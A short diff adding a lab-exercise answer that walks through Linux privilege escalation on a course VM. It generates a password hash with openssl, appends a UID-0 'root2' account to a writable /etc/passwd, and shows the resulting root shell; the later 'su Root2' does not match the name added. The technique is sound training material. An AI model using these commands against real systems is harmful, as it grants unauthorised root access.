@@ -1,0 +1,20 @@
+Questions 1
+Connect to VM 1 and repeat the steps discussed in this section in order to obtain a root shell. Which hashing algorithm has been used to encrypt the attacker's password?
+
+ssh joe@192.168.214.214
+# Generate the hash
+openssl passwd w00t
+86RTL4MAsPgAo
+
+# add Root2 user to /etc/passwd
+echo "root2:86RTL4MAsPgAo:0:0:root:/root:/bin/bash" >> /etc/passwd
+su Root2
+w00t
+
+root@debian-privesc:/home/joe# id
+uid=0(root) gid=0(root) groups=0(root)
+
+# Back to the question 'Which hashing algorithm has been used to encrypt the attacker's password?'
+We use openssl to generate the hash and Openssl using crypt algorithm.
+
+
